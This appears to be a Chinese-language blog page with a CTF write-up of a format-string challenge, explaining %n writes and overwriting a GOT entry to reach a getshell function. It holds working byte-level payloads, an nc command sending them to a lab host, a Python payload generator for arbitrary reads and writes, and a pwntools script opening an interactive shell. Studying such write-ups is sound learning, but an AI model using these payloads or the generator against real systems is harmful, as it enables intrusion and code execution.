@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html>
+<head>
+<link rel="shortcut icon" href="https://reticenceji.github.io/favicon.ico" type="image/x-icon" /><meta name="viewport"content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"/><meta name="apple-mobile-web-app-capable"content="yes"/><meta name="apple-mobile-web-app-status-bar-style"content="black"/><meta name="format-detection"content="telephone=no"/><meta name="renderer"content="webkit"><meta name="description"content=""><meta charset="UTF-8"><title>Format String bug-Easy Writeup | Reticence</title>
+<link href="https://reticenceji.github.io/styles/main.css" type="text/css" rel="stylesheet" /><link href="https://at.alicdn.com/t/font_1621793_zatzzgvf30g.css" type="text/css" rel="stylesheet" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css"><script async src="https://cdn.jsdelivr.net/npm/busuanzi@2.3.0/bsz.pure.mini.min.js"></script><script src="https://reticenceji.github.io/media/js/magnify.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js"></script>
+<script type="text/javascript">function btn_toggle(){document.getElementById("hn").classList.contains("no-js")?document.getElementById("hn").classList.remove("no-js"):document.getElementById("hn").classList.add("no-js")}</script>
+
+<link rel="canonical" href="https://reticenceji.github.io/post/format-string-bug-easy-writeup/" />
+</head>
+<body>
+<div class="progress"></div><style>.progress{background:linear-gradient(to right,#87ceeb var(--scroll),transparent 0);background-repeat:no-repeat;position:fixed;width:100%;height:4px;z-index:1}</style><div class="darkmode-background"></div><div class="darkmode-layer"></div>
+<noscript><p class="warn" >本页面需要浏览器支持（启用）JavaScript</p></noscript><div class="header"><div class="logo_title"><div class="title animated fadeInDown"><a href="https://reticenceji.github.io"><img alt="logo" style="display:inline-block;" src="https://reticenceji.github.io/images/avatar.png"/></a><h1 title="Reticence" class="weaklink"><a  href="/">Reticence</a></h1>
+
+<div class="navbar weaklink">
+<div class="normal_nav">
+<div class="bitcron_nav_container"><div class="bitcron_nav"><div class="bitcron_nav"><div style="display:flex;justify-content:center;"><nav class="mixed_site_nav_wrap site_nav_wrap"><ul class="mixed_site_nav site_nav sm sm-base">	<li><a id="d2ef19af68cc211e98f8a0242ac110003" href="/" class="selected active current nav__item" >Index</a></li><li><a id="d2ef19af68cc211e98f8a0242ac110003" href="/tags" class="selected active current nav__item" >Tags</a></li><li><a id="d2ef19af68cc211e98f8a0242ac110003" href="/archives" class="selected active current nav__item" >Archives</a></li><li><a id="d2ef19af68cc211e98f8a0242ac110003" href="/navigator.html" class="selected active current nav__item" >Navigator</a></li><li><a id="d2ef19af68cc211e98f8a0242ac110003" href="/post/about" class="selected active current nav__item" >About</a></li></ul></nav>
+<div style="float:right;margin-top:1em"><form id="gridea-search-form" data-update="1578893743252" action="/search/index.html"><input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="Search..."></form></div><div style="margin-left:0.5em;margin-top:1.2em"><input id="switch_default" onclick="mobileBtn()" type="checkbox" class="switch_default"><label for="switch_default" class="toggleBtn"></label></div></div>
+<div class="clear clear_nav_inline_end"></div></div></div><div class="clear clear_nav_end"></div></div></div><div class="hamberger" href="javascript:void(0)" onclick="btn_toggle();"><i class="iconfont icon-category"></i></div></div></div></div>
+<div id="hn" class="no-js hidden_nav animated fadeInDown"><div class="bitcron_nav_container"><div class="bitcron_nav"><nav class="mixed_site_nav_wrap site_nav_wrap"><ul class="mixed_site_nav site_nav sm sm-base">	<li><a id="d2ef19af68cc211e98f8a0242ac110003" href="/" class="selected active current nav__item" >Index</a></li><li><a id="d2ef19af68cc211e98f8a0242ac110003" href="/tags" class="selected active current nav__item" >Tags</a></li><li><a id="d2ef19af68cc211e98f8a0242ac110003" href="/archives" class="selected active current nav__item" >Archives</a></li><li><a id="d2ef19af68cc211e98f8a0242ac110003" href="/navigator.html" class="selected active current nav__item" >Navigator</a></li><li><a id="d2ef19af68cc211e98f8a0242ac110003" href="/post/about" class="selected active current nav__item" >About</a></li></ul><div class="clear clear_nav_inline_end"></div></nav></div><div class="clear clear_nav_end"></div></div>
+<div style="display:flex;justify-content:center;inline-block;text-align:center;margin-top:7%"><div><form id="gridea-search-form" data-update="1627835297708" action="/search/index.html"><input class="search-input" autocomplete="off" spellcheck="false" name="q"  placeholder="Search..." /></form></div><div style="margin-left:0.5em"><input id="switch_default_h" onclick="mobileBtn()" type="checkbox" class="switch_default"><label for="switch_default" class="toggleBtn"></label></div></div>
+</div></div>
+<script>function enableDarkmode(){document.body.classList.add("darkmode"),document.getElementById("switch_default").checked=1,document.getElementById("switch_default_h").checked=1}function removeDarkmode(){document.body.classList.remove("darkmode"),document.getElementById("switch_default").checked=0,document.getElementById("switch_default_h").checked=0}function getCookie(a){var b,c=new RegExp("(^| )"+a+"=([^;]*)(;|$)");return(b=document.cookie.match(c))?unescape(b[2]):null}cookie=getCookie("darkmode"),"enable"==cookie&&enableDarkmode(),window.matchMedia("(prefers-color-scheme: dark)").matches&&"disable"!==cookie&&(enableDarkmode(),document.cookie="darkmode=enable; path=/");var mobileBtn=function(){1==document.getElementById("switch_default").checked?(enableDarkmode(),document.cookie="darkmode=enable; path=/"):(removeDarkmode(),document.cookie="darkmode=disable; path=/")};</script>
+
+<div class="main"><div class="main-inner"><div class="content">
+<article class="post">
+<h2 class="post_title sm_margin"><a>Format String bug-Easy Writeup</a></h2>
+<script>function lan(){if(document.getElementById("lan").innerText=="繁"){var s=document.getElementById("tongwenlet_cn");if(s!=null){document.body.removeChild(s)}var s=document.createElement("script");s.language="javascript";s.type="text/javascript";s.src="https://cdn.jsdelivr.net/gh/qyxtim/Static@1.1/bookmarklet_tw.js";s.id="tongwenlet_cn";document.body.appendChild(s);document.getElementById("lan").innerHTML="简"}else{if(document.getElementById("lan").innerText=="簡"){var s=document.getElementById("tongwenlet_cn");if(s!=null){document.body.removeChild(s)}var s=document.createElement("script");s.language="javascript";s.type="text/javascript";s.src="https://cdn.jsdelivr.net/gh/qyxtim/Static@1.1/bookmarklet_cn.js";s.id="tongwenlet_cn";document.body.appendChild(s);document.getElementById("lan").innerHTML="繁"}}};</script>
+<section class="post_details"><i class="iconfont icon-calendar"></i><span style="margin-right:15px"> 2020-08-04</span><i class="iconfont icon-browse"></i><span style="margin-right:15px"> <span id="busuanzi_value_page_pv"></span> Views</span><i class="iconfont icon-category"></i><span class="weaklink" style="margin-right:15px">	<a href="https://reticenceji.github.io/tag/4n7nIsyFy/" class="tag">WriteUps</a></span><i class="iconfont icon-caret-down"></i><span style="margin-right:15px">2122字</span><i class="iconfont icon-naozhong"></i><span style="margin-right:15px">10 min read</span><a id="lan" href="javascript:void(0);"onclick="lan();"title="调整简繁体" style="margin-right:15px;">繁</a>
+</section>
+
+<div style="display:flex">
+<div class="md_block" id="md_block">
+<div class="round-shape-one"></div>
+<p>参考链接：https://www.freebuf.com/column/207425.html<br>
+https://blog.csdn.net/iteye_3619/article/details/81337202<br>
+https://www.cnblogs.com/ichunqiu/p/9329387.html</p>
+<h1 id="linux函数参数传递">Linux函数参数传递</h1>
+<figure data-type="image" tabindex="1"><img src="https://reticenceji.github.io/post-images/1596605549811.png" alt="" loading="lazy"></figure>
+<center>函数调用约定</center>
+<figure data-type="image" tabindex="2"><img src="https://reticenceji.github.io/post-images/1596605563030.png" alt="" loading="lazy"></figure>
+<center>内核接口调用约定</center>
+<figure data-type="image" tabindex="3"><img src="https://reticenceji.github.io/post-images/1596605574284.png" alt="" loading="lazy"></figure>
+<center>用户接口调用约定</center>
+<h1 id="c语言基础">C语言基础</h1>
+<p>%s：用于输出字符串。其本质上是读取对应的参数，并作为指针解析，获取到对应地址的字符串输出。<br>
+%n：一个特殊的控制字符，会把之前输出的字符数量存到对应的地址。也就是说printf()也可以向内存里写东西。<br>
+<code>printf(&quot;abcd%n&quot;,&amp;target); //会给target赋值4</code><br>
+我要在某个函数的返回地址写入0x0804861f（getshell的地址）<br>
+<s>对于这里来说，我输入的字符串，其地址作为第一个参数。然后五个参数会在寄存器获取，我无法控制。我要控制后面的参数。</s><br>
+<s>对于printf来说，他会在rdi寻找他的第一个参数（最右边），但实际上那个地方是我的输入。</s></p>
+<h3 id="任意读和这道题目关系不大">任意读（和这道题目关系不大）</h3>
+<p><strong>由于此时我们可以通过输入来操控栈，我们可以输入一个地址，再让%s正好对应到这个地址，从而输出地址指向的字符串，实现任意地址读。</strong><br>
+<code>&gt;&gt;AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.</code>发现是第四个参数<br>
+<img src="https://reticenceji.github.io/post-images/1596608733032.png" alt="" loading="lazy"><br>
+结合这张图，就知道为什么是第四个了。<br>
+addr里头可能会出现不可写的字符，需要用别的技巧输入。</p>
+<h3 id="任意写">任意写</h3>
+<p>这个搞清楚了任意写问题也不大了<br>
+构造<code>&gt;&gt;addr %你要写入的值-addr位数c~~ %4$n</code>可以实现</p>
+<h1 id="正确思路归纳">正确思路归纳</h1>
+<p>首先，file查看文件类型，IDA32反编译，gdb调试，objdump辅助。<br>
+发现getshell函数，位于 0x0804861f 处。要让控制流到这里。<br>
+修改GOT表，让控制流导向这个地方。<br>
+gdb调试，找到要修改的GOT表的位置，<br>
+<img src="https://reticenceji.github.io/post-images/1596631727569.png" alt="" loading="lazy"><br>
+<img src="https://reticenceji.github.io/post-images/1596631827661.png" alt="" loading="lazy"><br>
+先在本地用gdb修改尝试，发现拿到shell。<br>
+然后构造payload。</p>
+<h1 id="回顾总结">回顾总结</h1>
+<ol>
+<li>刚开始试图修改函数的返回地址，失败。原因是栈的位置不确定。<em>事实上现在程序的位置也是不确定的</em>，但是这道题应该是编译的时候去了随机化选项。</li>
+<li>最开始的payload是&quot;\x78\x9b\x04\x08%134514203c%4$n\n&quot;，但是这样子会输出好多好多空格，网络传输不行，而且程序还加了限时。根据参考链接的提示，修改了payload，一byte一byte来。</li>
+<li>GDB调试命令：<pre><code> 1. b *echo+60   设置断点
+ 2. b *0x80484a0 设置断点
+ 3. set *0xffffbb80=1234     修改内存
+ 4. set {char[100]}0xffffbb80= &quot;\x78\x9b\x04\x08\x79\x9b\x04\x08\x7a\x9b\x04\x08\x7b\x9b\x04\x08%15c%4$hhn%103c%5$hhn%126c%6$hhn%4c%7$hhn\n&quot;，修改一大块内存
+ 5. print *0x8049b78 打印内存的值
+ 6. r 开始跑，c 跑到下一个断点
+ 7. 回车会重复上一条命令
+</code></pre>
+</li>
+<li>PLT和GOT表，《CSAPP》上有讲。挺神奇的。</li>
+<li>打好基础知识！实践结合理论！</li>
+<li>累死我了。从早上10点左右开始，现在是晚上20点。。</li>
+<li>objdump -d 反汇编， --dynamic-syms       Display the contents of the dynamic symbol table</li>
+<li>IDApro F5反汇编</li>
+<li>主流的读写位置如下：(还不是很懂啊)<br>
+　　　　FINI_ARRAY区：程序初始化和结束需要经过这里，可以写这里的析构函数。<br>
+　　　　全局偏移表：(GOT)<br>
+　　　　全局函数指针：<br>
+　　　　atexit处理函数：<br>
+　　　　堆栈值（主要指返回地址）：<br>
+　　　　虚表指针：</li>
+</ol>
+<h1 id="flag">Flag</h1>
+<p>构造payload.txt:(虽然叫txt，但是是二进制文件！网络传输的缘故。)<br>
+&quot;\x78\x9b\x04\x08\x79\x9b\x04\x08\x7a\x9b\x04\x08\x7b\x9b\x04\x08%15c%4<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>h</mi><mi>h</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">hhn%103c%5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">h</span><span class="mord mathdefault">h</span><span class="mord mathdefault">n</span></span></span></span>hhn%126c%6<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>h</mi><mi>h</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">hhn%4c%7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">h</span><span class="mord mathdefault">h</span><span class="mord mathdefault">n</span></span></span></span>hhn\n&quot;<br>
+&quot;cat /data/flag\n&quot;<br>
+<code>nc nc 10.214.160.13 11005 &lt; payload.txt</code><br>
+拿到flag <code>AAA{what_f1ag_ls_A_g0od_flag?_qqgroup_386796080}</code></p>
+<h3 id="附思考过程以及草稿">附：思考过程以及草稿</h3>
+<p>file命令查看文件类型，ELF32位可执行文件。<br>
+载入到IDApro按F5可以反编译。</p>
+<p><s>0xffffbdec -&gt; 返回main的地址</s><br>
+<s>0xffffbbd0 -&gt; 参数开始位置</s></p>
+<p>通过计算，%135$08x，那个返回地址08048717，果然。<br>
+然后再压入的是ebp,ff859e68-c=ff859e5c<br>
+%134$08x.%135$08x.%136$08x.<br>
+%134$08p.%135$08p.%136<span class='katex-error' title='ParseError: KaTeX parse error: Undefined control sequence: \xec at position 33: …]} 0xffffbbf0=&quot;\̲x̲e̲c̲\xbd\xff\xff%13…'>08p.
+set {char[30]} 0xffffbbf0=&quot;\xec\xbd\xff\xff%13c%4</span>n\n&quot;</p>
+<p>反编译+手工修改：</p>
+<pre><code>int echo()
+{
+	char s[512];
+	memset(s,0,512);
+	fgets(s,512,stdin);
+	printf(s);
+    return bulabula;
+}
+</code></pre>
+<p>好像shellcode不用写，里头有个getshell函数。<br>
+getshell()就在echo()的后面，<s>似乎把ret 地址覆盖成0 就OK了。</s> call压入栈中的是绝对地址。因为可能涉及段跨越。和int同理。<br>
+%135$08x 我要在这里写入 0x0804861f（134514207）</p>
+<pre><code>问题是，这个地址是随机变化的。。。不是绝对的。虽然函数的入口地址是绝对的。
+这篇文章针对的就是这个问题 https://www.jianshu.com/p/07581c898e84
+改变思路，修改GOT表，让程序在puts的时候跳到 0x0804861f.
+0x8049b78 这里存着puts函数的入口。
+payload:&quot;\x78\x9b\x04\x08%134514203c%4$n\n&quot;
+如何输入不可见字符？ 
+`nc 10.214.160.13 11005 &lt; ./payload.txt`
+猜测是超时被关闭了
+\x78\x9b\x04\x08\x79\x9b\x04\x08\x7a\x9b\x04\x08\x7b\x9b\x04\x08%15c%4$hhn %67c%5$hhn%7ec%6$hhn%4c%7$hhn\n
+
+print *0x8049b78
+set {char[100]}0xffffbbf0=&quot;\x78\x9b\x04\x08\x79\x9b\x04\x08\x7a\x9b\x04\x08\x7b\x9b\x04\x08%15c%4$hhn%103c%5$hhn%126c%6$hhn%4c%7$hhn\n&quot;
+~~对于这里来说，我输入的字符串，其地址作为第一个参数。然后五个参数会在寄存器获取，我无法控制。我要控制后面的参数。~~
+~~对于printf来说，他会在rdi寻找他的第一个参数（最右边），但实际上那个地方是我的输入。~~
+
+</code></pre>
+<h2 id="附2">附2</h2>
+<p>一个半自动的payload生成器，至少不用手算了。据说《python黑帽子》也有类似的代码？<br>
+主要是练练python。。</p>
+<pre><code>#生成FotmatString漏洞的payload
+import argparse
+import sys
+
+def w_payload(addr,value):
+	payload = ''
+	output = b''
+	#地址的payload
+	for i in range(4):
+		output = output + (i+addr).to_bytes(4,'little')
+		for j in range(4):
+			payload = payload+r&quot;\x{:x}&quot;.format((i+addr&gt;&gt;8*j)%0x100)
+	#写入值的payload
+	c = []
+	for i in range(4):
+		c.append(((value&gt;&gt;8*i)%0x100 -(16 if i==0 else c[i-1])+0x100) %0x100)
+		payload = payload+r&quot;%{:d}c&quot;.format(c[i])
+		output = output+bytes(r&quot;%{:d}c&quot;.format(c[i]),encoding='ASCII')
+	payload = payload+&quot;%()$n\n&quot;
+	output = output+b&quot;%()$n\n&quot;
+	return payload,output
+
+def r_payload(addr):
+	payload = ''
+	output =(addr).to_bytes(4,'little')
+	for i in range(4):
+		payload = payload+r&quot;\x{:x}&quot;.format((addr&gt;&gt;8*i)%0x100)
+	payload = payload+&quot;%()$s\n&quot;
+	output = output+b&quot;%()$s\n&quot;
+	return payload,output
+
+def main():
+	#参数
+	parser = argparse.ArgumentParser(description=&quot;生成存在格式化字符串漏洞程序的Payload，括号部分要自己填啦&quot;)
+	parser.add_argument('-n',action='store_true',dest='n',help='如果指定了该参数，将提供确定参数在栈中位置的Payload')
+	parser.add_argument('-a',action='store',dest='addr',help=&quot;指定写入或查看的地址,必须指定&quot;)
+	parser.add_argument('-w',action='store_true',dest='write',help='指定该参数为写入，默认是读取')
+	parser.add_argument('-v',action='store',dest='value',help=&quot;指定写入的值，如果是十六进制需要以0x开头，否则认为是十进制&quot;)
+	parser.add_argument('-f',action='store',dest='file',default='payload.obj',help=&quot;指定输出的文件名，如果是十六进制需要以0x开头，否则认为是十进制&quot;)
+	arguments = parser.parse_args()
+	
+	#数据处理
+	filename=arguments.file
+	if arguments.n:
+		payload = &quot;AAAA.%x%x%x%x.%x%x%x%x.%x%x%x%x.%x%x%x%x.%x%x%x%x.%x%x%x%x.%x%x%x%x.%x%x%x%x\n&quot;
+		output = b&quot;AAAA.%x%x%x%x.%x%x%x%x.%x%x%x%x.%x%x%x%x.%x%x%x%x.%x%x%x%x.%x%x%x%x.%x%x%x%x\n&quot;
+	elif (arguments.write):
+		if (arguments.value is None or arguments.addr is None):
+			print(&quot;你需要指定写入的值-v和写入的地址-a&quot;)
+			sys.exit()
+		addr=int(arguments.addr,base=16) if arguments.addr[0:2]=='0x' else int(arguments.addr,base=10) 
+		value = int(arguments.value,base=16) if arguments.value[0:2]=='0x' else int(arguments.value,base=10) 
+		payload,output = w_payload(addr,value)
+	else:	
+		if (arguments.addr is None):
+			print(&quot;你需要指定读取的地址-a&quot;)
+			sys.exit()
+		addr=int(arguments.addr,base=16) if arguments.addr[0:2]=='0x' else int(arguments.addr,base=10) 
+		payload,output = r_payload(addr)
+
+	#输出部分
+	print(payload,end='')
+	with open(filename,'wb') as fileobj:
+		fileobj.write(output)	
+
+if __name__ == &quot;__main__&quot;:
+	main()
+</code></pre>
+<h2 id="附3pwntools的使用">附3：pwntools的使用</h2>
+<p>参考链接：https://bbs.pediy.com/thread-247217.htm</p>
+<pre><code>from pwn import *
+
+#创建一个远程连接
+c = remote('10.214.160.13',11005)
+#发送数据，sendline会自动回车
+c.sendline(&quot;\x78\x9b\x04\x08\x79\x9b\x04\x08\x7a\x9b\x04\x08\x7b\x9b\x04\x08%15c%4$hhn%103c%5$hhn%126c%6$hhn%4c%7$hhn&quot;)
+#交互式shell
+c.interactive()
+</code></pre>
+
+<span id="footnote"></span>
+<div id = "warn"></div>
+</div>
+<div class="toc-container"><ul class="markdownIt-TOC">
+<li><a href="#linux%E5%87%BD%E6%95%B0%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92">Linux函数参数传递</a></li>
+<li><a href="#c%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80">C语言基础</a><br>
+*
+<ul>
+<li><a href="#%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%92%8C%E8%BF%99%E9%81%93%E9%A2%98%E7%9B%AE%E5%85%B3%E7%B3%BB%E4%B8%8D%E5%A4%A7">任意读（和这道题目关系不大）</a></li>
+<li><a href="#%E4%BB%BB%E6%84%8F%E5%86%99">任意写</a></li>
+</ul>
+</li>
+<li><a href="#%E6%AD%A3%E7%A1%AE%E6%80%9D%E8%B7%AF%E5%BD%92%E7%BA%B3">正确思路归纳</a></li>
+<li><a href="#%E5%9B%9E%E9%A1%BE%E6%80%BB%E7%BB%93">回顾总结</a></li>
+<li><a href="#flag">Flag</a><br>
+*
+<ul>
+<li><a href="#%E9%99%84%E6%80%9D%E8%80%83%E8%BF%87%E7%A8%8B%E4%BB%A5%E5%8F%8A%E8%8D%89%E7%A8%BF">附：思考过程以及草稿</a></li>
+<li><a href="#%E9%99%842">附2</a></li>
+<li><a href="#%E9%99%843pwntools%E7%9A%84%E4%BD%BF%E7%94%A8">附3：pwntools的使用</a></li>
+</ul>
+</li>
+</ul>
+</div>
+</div>
+<div id="fullPage"><canvas id="canvas"></canvas></div>
+</article>
+<div id="eof"><span>EOF</span></div><div class="round-shape-one"></div>
+<section>
+<div class="doc_comments">
+
+</div></section>
+</div></div></div><script>
+"use strict";!function(){for(var n=document.getElementsByTagName("pre"),e=n.length,s=0;s<e;s++){n[s].innerHTML='<span class="line-number"></span>'+n[s].innerHTML+'<span class="cl"></span>';for(var a=n[s].innerHTML.split(/\n/).length,r=0;r<a-1;r++){n[s].getElementsByTagName("span")[0].innerHTML+="<span>"+(r+1)+"</span>"}}}();
+let mainNavLinks=document.querySelectorAll(".markdownIt-TOC a");window.addEventListener("scroll",event=>{let fromTop=window.scrollY;mainNavLinks.forEach((link,index)=>{let section=document.getElementById(decodeURI(link.hash).substring(1));let nextSection=null
+if(mainNavLinks[index+1]){nextSection=document.getElementById(decodeURI(mainNavLinks[index+1].hash).substring(1));}
+if(section.offsetTop<=fromTop){if(nextSection){if(nextSection.offsetTop>fromTop){link.classList.add("currentToc");}else{link.classList.remove("currentToc");}}else{link.classList.add("currentToc");}}else{link.classList.remove("currentToc");}});});
+var h=document.documentElement,b=document.body,st="scrollTop",sh="scrollHeight",progress=document.querySelector(".progress"),scroll;document.addEventListener("scroll",function(){scroll=(h[st]||b[st])/((h[sh]||b[sh])-h.clientHeight)*100;progress.style.setProperty("--scroll",scroll+"%")});
+var wxScale=new WxScale({fullPage:document.querySelector("#fullPage"),canvas:document.querySelector("#canvas")});var imgBox=document.querySelectorAll("#md_block img");for(var i=0;i<imgBox.length;i++){imgBox[i].onclick=function(e){wxScale.start(this)}};
+</script>
+<a id="scrollUp" href="#top" style="position: fixed; z-index: 2147483647; display: block;"></a><div class="footer animated fadeInDown"><div class="site_footer"><div class="mysocials"><div class="my_socials"><a href="https://github.com/reticenceji"title="github"><i class="iconfont icon-github"></i></a><a href="reticenceji@qq.com"title="envelope"><i class="iconfont icon-envelope"></i></a><a href="https://www.zhihu.com/people/reticenceji"title="zhihu"><i class="iconfont icon-zhihu"></i></a></div></div><div class="copyright"id="copyright">Copyright © 2018-2020 <a href="https://reticenceji.github.io" style="margin:0;">Reticence</a>.</div>
+<span style="display: inline;margin-right:15px;">👁<strong><span id="busuanzi_value_site_uv"></span></strong></span><span id="busuanzi_container_page_pv" style="display: inline;"><span>📚<strong>176</strong> posts</span></div></div>
+<script>
+console.log("\n %c \u26a1Theme: Bitcron-pro Author's Blog:https://blog.blinkstar.cn  Writen By Serence  \n\n", "color: #ffffff; background: rgba(49, 49, 49, 0.85); padding:5px 0;border-radius:5px;", );
+</script>
+<script src="https://cdn.jsdelivr.net/npm/instant.page@3.0.0/instantpage.min.js" type="module" defer></script>
+<script type="text/javascript" async src="https://reticenceji.github.io/media/js/prism.js"></script>
+</body>
+</html>
